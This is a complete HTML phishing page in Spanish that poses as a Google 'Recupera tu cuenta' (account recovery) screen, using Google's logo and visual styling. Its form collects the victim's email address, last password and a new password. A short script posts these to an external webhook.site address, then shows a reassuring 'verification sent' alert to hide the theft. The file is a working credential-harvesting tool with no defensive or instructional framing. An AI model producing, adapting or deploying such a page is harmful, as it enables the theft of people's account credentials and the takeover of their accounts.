
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Recupera tu cuenta</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background-color: #fff;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 450px;
      text-align: center;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      color: #202124;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #5f6368;
    }
    input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-top: 15px;
    }
    button {
      margin-top: 25px;
      background-color: #1a73e8;
      color: white;
      padding: 10px 24px;
      font-size: 14px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1765cc;
    }
    footer {
      font-size: 12px;
      margin-top: 20px;
      color: #5f6368;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" />
    <h1>Recupera tu cuenta</h1>
    <p>Ingresa los datos requeridos</p>
    <form id="formulario">
      <input type="email" name="correo" id="correo" required placeholder="Correo electrónico" />
      <input type="password" name="contrasena" id="contrasena" required placeholder="Última contraseña" />
      <input type="password" name="nueva" id="nueva" required placeholder="Nueva contraseña" />
      <button type="submit">Enviar</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('formulario');
    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const correo = document.getElementById('correo').value;
      const contrasena = document.getElementById('contrasena').value;
      const nueva = document.getElementById('nueva').value;

      const data = new FormData();
      data.append("Correo electrónico", correo);
      data.append("Última contraseña", contrasena);
      data.append("Nueva contraseña", nueva);

      fetch("https://webhook.site/53652536-5d89-4426-9ce4-f8ae3d19f889", {
        method: "POST",
        body: data
      }).then(() => {
        alert("Verificación enviada. Revisa tu cuenta.");
        form.reset();
      }).catch(() => {
        alert("Error al enviar. Intenta de nuevo.");
      });
    });
  </script>
</body>
</html>
